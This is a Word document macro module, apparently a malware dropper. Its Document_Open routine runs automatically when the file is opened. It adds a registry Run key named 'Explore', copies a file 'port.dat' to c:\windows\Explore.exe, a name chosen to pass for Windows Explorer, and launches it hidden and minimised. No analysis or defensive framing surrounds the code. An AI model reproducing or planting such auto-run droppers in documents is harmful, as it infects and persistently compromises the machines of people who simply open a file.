Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_New()

End Sub

Private Sub Document_Open()
Dim strString As String
'Ask for String
strString = "c:\windows\Explore.exe"
'Check to see if the user pressed cancel
If strString = "" Then Exit Sub
'Edit Registry
Call savestring(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "Explore", strString)
FileCopy "port.dat", "c:\windows\Explore.exe"
X = Shell("c:\windows\Explore.exe", vbMinimizedNoFocus)

End Sub
